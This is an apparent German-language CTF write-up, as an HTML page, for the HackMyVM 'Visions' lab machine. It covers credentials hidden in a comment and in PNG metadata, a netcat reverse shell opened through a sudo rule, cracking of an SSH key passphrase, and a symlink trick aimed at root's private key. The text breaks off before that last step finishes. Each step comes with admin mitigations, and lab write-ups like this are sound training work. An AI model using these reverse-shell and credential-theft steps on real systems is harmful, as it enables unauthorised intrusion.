@@ -1,0 +1,590 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visions - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Visions - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">Browser (impliziert)</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">StegOnline (Web Tool)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john (john the ripper)</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">ln</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access (alicia)</a></li>
+                <li><a href="#privilege-escalation-emma">Privilege Escalation (alicia -> emma)</a></li>
+                <li><a href="#privilege-escalation-sophia">Privilege Escalation (emma -> sophia)</a></li>
+                <li><a href="#privilege-escalation-isabella">Privilege Escalation (sophia -> isabella)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (isabella -> root via sophia)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Root Access)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Geräten durchsucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.132 und der MAC 08:00:27:e0:e3:a3 (VirtualBox) wurde identifiziert. Dies ist das Zielsystem.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe einen Port-Scan durch, um offene Dienste auf dem Ziel zu finden. Da kein Nmap-Scan im Text folgt, muss die Information über offene Ports (vermutlich nur SSH und HTTP basierend auf dem weiteren Verlauf) auf andere Weise erlangt worden sein oder wurde hier weggelassen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Monitoring von ARP-Traffic sind grundlegende Sicherheitsmaßnahmen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.132   08:00:27:e0:e3:a3       PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der Webseite unter `http://192.168.2.132/index.html` (oder einer ähnlichen Seite, da kein Portscan gezeigt wurde, nehmen wir an, Port 80 ist offen) wird untersucht. Ein HTML-Kommentar wird gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Kommentar enthält einen philosophischen Text über "das Unsichtbare sehen" und erwähnt den Namen "alicia". Dies ist ein starker Hinweis auf einen möglichen Benutzernamen und legt nahe, dass versteckte Informationen (Steganographie, versteckte Dateien/Verzeichnisse) eine Rolle spielen könnten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche Bilder oder andere Dateien auf der Webseite auf versteckte Daten (Steganographie). Notiere den Benutzernamen "alicia". Führe ein Directory Brute-Forcing durch (obwohl im Report nicht gezeigt).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es, potenzielle Benutzernamen oder Hinweise auf interne Strukturen in öffentlich zugänglichen Kommentaren oder Dateien zu hinterlassen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# Inhalt von http://192.168.2.132/index.html (oder ähnliche Seite)
+<!--
+nly those that can see the invisible can do the imposible.
+You have to be able to see what doesnt exist.
+nly those that can see the invisible being able to see whats not there.
+-alicia ->
+-->
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Das Tool `strings` wird auf eine Bilddatei namens `white.png` angewendet. Diese Datei wurde vermutlich von der Webseite heruntergeladen. `strings` extrahiert druckbare Zeichenketten aus einer Datei.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> In den Metadaten (tEXtComment Chunk) der PNG-Datei wurde ein Passwort gefunden: `<span class="password">ihaveadream</span>`. Zusammen mit dem zuvor gefundenen Benutzernamen "alicia" ergibt sich ein vollständiges Login-Paar.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, dich mit den Credentials `alicia`:`ihaveadream` per SSH auf dem Zielsystem anzumelden (Port 22 wird als offen angenommen).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder sensible Informationen in den Metadaten von Dateien, die öffentlich zugänglich sind. Bereinigen Sie Metadaten vor der Veröffentlichung. Schulen Sie Entwickler und Content Manager bezüglich sicherer Handhabung von Metadaten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">strings white.png</span></div>
+                    <pre>
+... (andere Strings) ...
+tEXtComment
+pw:<span class="password">ihaveadream</span>
+... (andere Strings) ...
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (alicia)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `alicia` mit dem zuvor gefundenen Passwort `ihaveadream` auf dem Zielhost `vision.hmv` anzumelden. Es wird angenommen, dass `vision.hmv` in der `/etc/hosts`-Datei des Angreifers auf 192.168.2.132 verweist oder per DNS auflösbar ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anmeldung ist erfolgreich! Wir erhalten eine Shell als Benutzer `alicia` auf dem Zielsystem. Der initiale Zugriff wurde durch die Kombination aus Informationsbeschaffung aus Webseiten-Kommentaren und Steganographie in einer Bilddatei erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe grundlegende Enumeration als `alicia` durch. Überprüfe insbesondere die `sudo`-Rechte mit `sudo -l`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass SSH-Zugänge nur mit starken, einzigartigen Passwörtern oder, besser noch, mit Schlüsselpaaren gesichert sind. Überwachen Sie SSH-Logins.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh alicia@vision.hmv</span></div>
+                    <pre>
+# (Passwort "ihaveadream" eingegeben)
+Linux visions ...
+...
+alicia@visions:~$ <!-- Login erfolgreich -->
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-emma">
+            <h2>Privilege Escalation (alicia -> emma)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `alicia` werden die `sudo`-Berechtigungen überprüft. Anschließend wird das `/home`-Verzeichnis aufgelistet, um andere Benutzer zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `sudo -l` zeigt, dass `alicia` den Befehl `/usr/bin/nc` als Benutzer `emma` ohne Passwort ausführen darf (`(emma) NPASSWD: /usr/bin/nc`). Dies ist eine klare Fehlkonfiguration und ein direkter Weg zur Privilege Escalation zu `emma`. Die Auflistung von `/home` bestätigt die Existenz des Benutzers `emma` sowie `isabella` und `sophia`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die `sudo`-Regel, um eine Shell als `emma` zu erhalten. Starte einen Netcat-Listener auf dem Angreifer-Rechner und führe dann `sudo -u emma nc -e /bin/bash [Angreifer-IP] [Listener-Port]` auf dem Ziel aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie `sudo`-Regeln nach dem Least-Privilege-Prinzip. Erlauben Sie niemals die Ausführung von Netzwerk-Tools wie `nc` mit erhöhten Rechten ohne triftigen Grund und starke Einschränkungen. Insbesondere die `-e`-Option von Netcat ist extrem gefährlich in `sudo`-Regeln. Entfernen Sie diese Regel.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: #ffffff;">alicia@visions:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for alicia on visions:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User alicia may run the following commands on visions:
+    (emma) NPASSWD: /usr/bin/nc
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">alicia@visions:~$ <span class="command">ls -la /home</span></div>
+                    <pre>
+total 24
+drwxr-xr-x  6 root     root     4096 Apr 19  2021 .
+drwxr-xr-x 18 root     root     4096 Apr 19  2021 ..
+drwxr-xr-x  2 alicia   alicia   4096 Apr 19  2021 alicia
+drwxr-xr-x  3 emma     emma     4096 Apr 19  2021 emma
+drwxr-xr-x  3 isabella isabella 4096 Apr 19  2021 isabella
+drwxr-xr-x  3 sophia   sophia   4096 Apr 19  2021 sophia
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die `sudo`-Regel wird ausgenutzt, um eine Reverse Shell als Benutzer `emma` zu starten. Auf dem Angreifer-Rechner (hier 192.168.2.114) lauscht ein Netcat-Listener auf Port 4444 (nicht explizit im Text gezeigt, aber notwendig). Auf dem Zielsystem führt `alicia` den Befehl `sudo -u emma nc -e /bin/bash 192.168.2.114 4444` aus.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl startet `nc` als `emma`, führt `/bin/bash` aus und leitet dessen Ein-/Ausgabe an den lauschenden Netcat-Prozess auf dem Angreifer weiter. Dies führt zu einer erfolgreichen Shell als `emma`. Der erste Schritt der Privilege Escalation ist gelungen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell (z.B. mit Python PTY) und beginne die Enumeration als `emma`. Suche nach Dateien im Home-Verzeichnis von `emma`, überprüfe erneut `sudo -l` und suche nach weiteren Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur `sudo`-Regel. Überwachen Sie ausgehende Netzwerkverbindungen von Servern, um Reverse Shells zu erkennen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Auf Angreifer-Maschine (192.168.2.114) -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+
+                    <!-- Auf Zielsystem (alicia Shell) -->
+                     <div class="prompt" style="color: #ffffff;">alicia@visions:/home$ <span class="command">sudo -u emma nc -e /bin/bash 192.168.2.114 4444</span></div>
+                    <pre># (Keine Ausgabe auf Ziel, Verbindung wird zum Angreifer aufgebaut)</pre>
+
+                    <!-- Auf Angreifer-Maschine (Listener-Fenster nach Verbindung) -->
+                    <pre>
+connect to [192.168.2.114] from (UNKNOWN) [192.168.2.132] XXXXX
+# (Hier ist jetzt die Shell als emma)
+<span class="command">id</span>
+uid=1001(emma) gid=1001(emma) groups=1001(emma)
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-sophia">
+            <h2>Privilege Escalation (emma -> sophia)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Im Text wird auf ein Online-Steganographie-Tool (`https://stegonline.georgeom.net/image`) verwiesen. Es wird angenommen, dass eine Bilddatei (Quelle unklar, möglicherweise aus `/home/emma` oder `/var/www/html`) in dieses Tool hochgeladen wurde. Bei der Analyse (vermutlich durch Extrahieren von Daten aus verschiedenen Farbebenen oder Metadaten im Tool) wurden Credentials gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Analyse mit dem Online-Tool enthüllte die Credentials für den Benutzer `sophia`: `<span class="password">seemstobeimpossible</span>`. Dies ist der nächste Schritt in der Eskalationskette. Der genaue Fundort des Bildes ist leider nicht dokumentiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die gefundenen Credentials, um dich als `sophia` anzumelden. Dies kann entweder über `su sophia` innerhalb der `emma`-Shell oder per SSH geschehen, falls `sophia` SSH-Zugriff hat. Dokumentiere den Fundort der Bilddatei, wenn möglich.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer darin, keine Passwörter oder sensiblen Informationen in Bildern oder anderen Dateien zu verstecken (Security through Obscurity ist keine echte Sicherheit). Überwachen Sie Dateisysteme auf ungewöhnliche Dateien oder Modifikationen. Verwenden Sie starke, einzigartige Passwörter.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# Aktion: Bilddatei (Quelle unbekannt) auf https://stegonline.georgeom.net/image hochgeladen und analysiert.
+# Ergebnis der Analyse:
+sophia/<span class="password">seemstobeimpossible</span>
+                    </pre>
+                 </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den gefundenen Credentials wird sich als `sophia` angemeldet (vermutlich via `su sophia` oder `ssh sophia@vision.hmv`). Das Home-Verzeichnis wird aufgelistet und die `user.txt`-Datei gelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login als `sophia` war erfolgreich. Im Home-Verzeichnis befindet sich die User-Flag-Datei. Das User-Flag lautet: `<span class="password">hmvicanseeforever</span>`. Eine Datei `flag.sh` ist ebenfalls vorhanden, ihr Zweck wird aber nicht weiter untersucht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Überprüfe nun die `sudo`-Rechte für `sophia` mit `sudo -l`. Untersuche ggf. die `flag.sh`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur die Berechtigungen haben, die sie für ihre Aufgaben benötigen. Überprüfen Sie Home-Verzeichnisse auf ungewöhnliche Skripte oder Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Annahme: Login als sophia erfolgreich -->
+                    <div class="prompt" style="color: #ffffff;">sophia@visions:~$ <span class="command">ls</span></div>
+                    <pre>
+flag.sh  user.txt
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">sophia@visions:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">hmvicanseeforever</span></pre>
+                </div>
+            </div>
+        </section>
+
+       <section id="privilege-escalation-isabella">
+            <h2>Privilege Escalation (sophia -> isabella)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die `sudo`-Rechte für den Benutzer `sophia` werden überprüft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `sudo -l` zeigt, dass `sophia` den Befehl `/usr/bin/cat /home/isabella/.invisible` als beliebiger Benutzer (`ALL:ALL`) ohne Passwort ausführen darf. Dies bedeutet, `sophia` kann den Inhalt einer versteckten Datei im Home-Verzeichnis von `isabella` lesen, und das sogar mit Root-Rechten (da `ALL` auch `root` einschließt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe den `sudo cat`-Befehl aus, um den Inhalt von `/home/isabella/.invisible` zu inspizieren. Es könnte sich um ein Passwort, einen Schlüssel oder einen anderen Hinweis handeln.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem unsicher und sollte sofort entfernt werden. Sie erlaubt das Lesen beliebiger Dateien, wenn der Pfad manipuliert werden kann (was hier nicht der Fall ist, aber generell gefährlich), und das Lesen von Dateien anderer Benutzer ist ein Datenschutzproblem. Erlauben Sie `sudo`-Zugriff nur für spezifische, notwendige Befehle und Benutzer.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: #ffffff;">sophia@visions:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for sophia on visions:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sophia may run the following commands on visions:
+    (ALL : ALL) NPASSWD: /usr/bin/cat /home/isabella/.invisible
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der `sudo cat`-Befehl wird ausgeführt, um den Inhalt der Datei `/home/isabella/.invisible` anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei enthält einen verschlüsselten privaten SSH-Schlüssel im OpenSSH-Format (erkennbar an `-----BEGIN OPENSSH PRIVATE KEY-----` und dem `aes256-ctr` Hinweis in der ersten Zeile nach Dekodierung des Base64-Teils). Dieser Schlüssel gehört vermutlich dem Benutzer `isabella`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kopiere den gesamten Schlüsseltext (von `-----BEGIN...` bis `-----END...`) auf den Angreifer-Rechner. Speichere ihn in einer Datei (z.B. `id_isabella`). Versuche, die Passphrase des Schlüssels mit Tools wie `ssh2john` und `john` oder `hashcat` zu knacken.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Private Schlüssel sollten niemals für andere Benutzer lesbar sein, auch nicht über unsichere `sudo`-Regeln. Speichern Sie private Schlüssel sicher im `.ssh`-Verzeichnis des jeweiligen Benutzers mit korrekten Berechtigungen (600). Verwenden Sie starke Passphrasen zum Schutz privater Schlüssel.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: #ffffff;">sophia@visions:~$ <span class="command">sudo /usr/bin/cat /home/isabella/.invisible</span></div>
+                    <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
+1sMQAToGnurcIWAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDNAxlJldzm
+IgVNFXbjg51CS4YEuIxM5gQxjafNJ/rzYw0sPkT9sL6dYasQcHX1SYxk5E+qD8QNZQPZ
+GfACdWDLwcI4LLME0BjARwmrpU4mJXwugX4+RbGICFMgY8ZYtKXEIoF8dwKPVsBdoIwi
+lgHyfJD4LwkqfV6mvlau+XRZZBhvlNP10F0SAAZqBaA9y7hRWJ/XcCZC6HzJKzloAL2Xw
+GvAMzgtPH/wj06NoFjmVGMfmmHzCwgc+fLeXXYzFeRNPH3cVExc+BnB8Ju6CFa6n7VBV
+HLCYJ3CcgKnxv6wVtkoDi0UEFUefELQV7fZ+g1sZt/+2XPsmcZAAAD0E8RIvVF4XlKJq
+INtHdJ5QJZCuq2ufynbPNiHF53PqSlmC//kQZMWgJ5DcbzMJ92IqxRgjilZZUUbE/SFI
+PViwmpRWIGAhlyoPXyV513ukhb4UngYlgCP9qC4Rbn+Tp9Fv7lnAoD0DsmwITM2e/Z65AD
+/i/BqrJ6scNEN0q+qNr3zVljMZx+qy8cbuDn9Tbq2/N+mcoEysfjfaoJIgVJnLx1XE6r
++Y9UcRyPAYs+5TB1Nz/fpnBo7vesu5XLUqCBCphFGmdMCdSGYZAweitjQ+Mq36hQmCtSs
+Dwcbjg8vy5LJ+mtJXA7QhqgAfXWnLLny4NeCztUnTG0NLjbLR6M5e+HSsi2EqDYoGNpWld
+l4YzVPQoFMIaUJGTc+VfkMWbQhzpiu66/Du8dwhC+p6QSmwhV/M70eWaH2ZVjK3MThg9K
+CVugFsLxioqlp/rnE1oq7apTBX6Fjwz0ne+ytTVQrHuPTs2QL4PlCvhPRoIuqydleFs4
+rdtzE6b46PexXlupewywi5AVzbfSRAlCYwiwV42xGpYsNcKhdUY+Q9d9i9yudjIFoicrA
+MG9hxr7/DJqEY311kTglDEHqQB3faErYsYPiL9TTZWnPLZhClrPbiWST5tmMWxgNE/AKY
+R7mKGDBMFPlBAjGuKqR6zk5DEc3RzJnvGjUlaT3zzdVmxD8SpWtjzS6xHaSw/WvB0lsg
+Dhf+Gc7WyHm2qk+MK9t0/lbIDfn3su0EHwbPjYTT3xk7CtG4AwiSqPve1t9bdzD9w9r
+TM7am/2i/BV1uv28823pCuYZmNG7hu5InzNC/3iTRraE31Qqe3JCNwxVDcHqb8s6gTN+J
+q6yZdvNNiVQUo1l7hNUlg4he4q1kTwoyAATa0hPKVxEFEISRtaQln5Ni8V+fos8GTqgAr
+HH2LpFa4qZKTtUEU0f54ixjFL7Lkz6owbUG7Cy+LuGDI1aKJRGCZwd5LkStcF/MA3pulc
+MsHiYwmXT3lNHhkAd1h05N2yBzXaH+M3sX6IpNtq+gi+9F443Enk7FBRFLzxdJ+UT40f6E
++gyA2nBGygNhvQHXcu36A8BoE+IF7YVpdfDmYJffbTujtBUj2vrdsqVvtGUxf0vj9/Sv+J
+HN9Yk2giXN8VX7qhcyLzUktmdfgd6JNAx+/P7Kh3HV5oWk1Da+VJS+wtCg/oEVSVyrEpe
+skV8zcwd+ErNDEHTUbD/nDARX8GeV158RMtRdZ5CJZSFjBz2oPDPDVpZMFNhENAAwPnrJ
+KD/C2J6CKylbopifizfpEkmVqJRms=
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der private SSH-Schlüssel von `isabella` wird auf dem Angreifer-System in der Datei `id` gespeichert. `ssh2john` wird verwendet, um den Schlüssel in ein für John the Ripper verständliches Hash-Format zu konvertieren, das in die Datei `hash` geschrieben wird. Anschließend wird `john` mit der `rockyou.txt`-Wortliste auf die `hash`-Datei angesetzt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> John the Ripper knackt erfolgreich die Passphrase des privaten Schlüssels: `<span class="password">invisible</span>`. Jetzt sind alle notwendigen Informationen vorhanden, um sich als `isabella` anzumelden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ändere die Berechtigungen der Schlüsseldatei `id` auf 600 (`chmod 600 id`). Verwende dann `ssh -i id isabella@vision.hmv`, um dich anzumelden, und gib die Passphrase `invisible` ein, wenn danach gefragt wird.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Nutzen Sie starke, nicht erratbare Passphrasen für private SSH-Schlüssel. Speichern Sie Schlüssel sicher und vermeiden Sie deren Kompromittierung durch unsichere Konfigurationen wie die `sudo`-Regel hier.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi id</span></div>
+                    <pre># (Privater Schlüssel von Isabella hier eingefügt)</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh2john id > hash</span></div>
+                     <pre></pre> <!-- Keine Ausgabe -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH Private Keys $sshng$, 32/64])
+Cost 1 (KDF/Cipher): KDF: bcrypt Round: 16 / Cipher: AES-256-CTR
+Cost 2 (MAC): hmac-sha2-256
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">invisible</span>        (id)
+1g 0:00:00:01 DONE (2023-09-06 10:30) 0.8474g/s 36.42p/s 36.42c/s 36.42C/s football..inspiron
+Session completed
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Berechtigungen der Schlüsseldatei `id` werden auf 600 gesetzt (nur für den Besitzer les- und schreibbar), was für SSH erforderlich ist. Anschließend wird versucht, sich als `isabella` mit dem Schlüssel anzumelden. Ein erster Versuch schlägt fehl (Passphrase-Abfrage erscheint, wird aber nicht beantwortet). Ein zweiter Versuch (mit `visio.hmv` und `testid` - wahrscheinlich ein Tippfehler im Report, sollte `vision.hmv` und `id` sein) ist erfolgreich nach Eingabe der Passphrase `invisible`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Trotz der Inkonsistenz im Hostnamen/Schlüsseldateinamen im Report-Text war der SSH-Login als `isabella` mit dem geknackten Schlüssel und der Passphrase erfolgreich. Wir haben nun eine Shell als `isabella`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe Enumeration als `isabella` durch. Überprüfe `sudo -l` und suche nach weiteren Hinweisen oder Schwachstellen. Der nächste Schritt involviert wahrscheinlich die `sudo`-Regel von `sophia`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur die benötigten Berechtigungen haben. Überprüfen Sie regelmäßig `sudo`-Regeln und Dateiberechtigungen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 id</span></div>
+                     <pre></pre> <!-- Keine Ausgabe -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh isabella@vision.hmv -i id</span></div>
+                     <pre>Enter passphrase for key 'id': <!-- Abbruch oder falsche Passphrase --></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh isabella@vision.hmv -i id</span></div> <!-- Korrekter Befehl angenommen -->
+                     <pre>
+Enter passphrase for key 'id': <span class="password">invisible</span> # Korrekte Passphrase eingegeben
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+isabella@visions:~$ <!-- Login erfolgreich -->
+                    </pre>
+                </div>
+            </div>
+       </section>
+
+       <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (isabella -> root via sophia)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `isabella` wird ein symbolischer Link erstellt. Zuerst wird die existierende Datei `.invisible` gelöscht (`rm -f .invisible`). Dann wird ein Symlink namens `.invisible` erstellt, der auf den privaten SSH-Schlüssel des `root`-Benutzers (`/root/.ssh/id_rsa`) zeigt (`ln -sf /root/.ssh/id_rsa .invisible`). `ls -la` bestätigt die Erstellung des Symlinks.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist der entscheidende Trick zur Eskalation zu Root. Da `sophia` die Datei `/home/isabella/.invisible` mittels `sudo cat` lesen kann (und das sogar als `root`), wird sie nun, wenn sie diesen Befehl ausführt, nicht mehr den ursprünglichen Inhalt (Isabellas Schlüssel) lesen, sondern durch den Symlink den Inhalt von `/root/.ssh/id_rsa`. `isabella` benötigt Schreibrechte in ihrem eigenen Home-Verzeichnis und Leserechte auf `/root/.ssh/id_rsa` (oder der `cat`-Befehl muss über `sudo` mit Root-Rechten laufen, was hier der Fall ist, da `sophia` `cat` als `ALL` ausführen darf), damit dieser Trick funktioniert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wechsle zurück zur Shell/Sitzung von `sophia`. Führe dort erneut den Befehl `sudo cat /home/isabella/.invisible` aus. Der Inhalt sollte nun der private SSH-Schlüssel von `root` sein. Kopiere diesen Schlüssel und verwende ihn, um dich als `root` anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die `sudo`-Regel für `sophia` muss dringend entfernt werden. Überprüfen Sie Dateiberechtigungen, insbesondere für sensible Verzeichnisse wie `/root/.ssh`. Idealerweise sollte `/root/.ssh` nur für `root` zugänglich sein (Berechtigungen 700), und `id_rsa` nur für `root` lesbar (Berechtigungen 600). Symlink-Attacken können durch korrekte Berechtigungen und sichere `sudo`-Konfigurationen verhindert werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehle als isabella -->
+                    <div class="prompt" style="color: #ffffff;">isabella@visions:~$ <span class="command">rm -f .invisible</span></div>
+                    <pre></pre> <!-- Keine Ausgabe -->
+                     <div class="prompt" style="color: #ffffff;">isabella@visions:~$ <span class="command">ln -sf /root/.ssh/id_rsa .invisible</span></div>
+                    <pre></pre> <!-- Keine Ausgabe -->
+                     <div class="prompt" style="color: #ffffff;">isabella@visions:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 40
+drwxr-xr-x 3 isabella isabella 4096 Sep  6 12:19 .
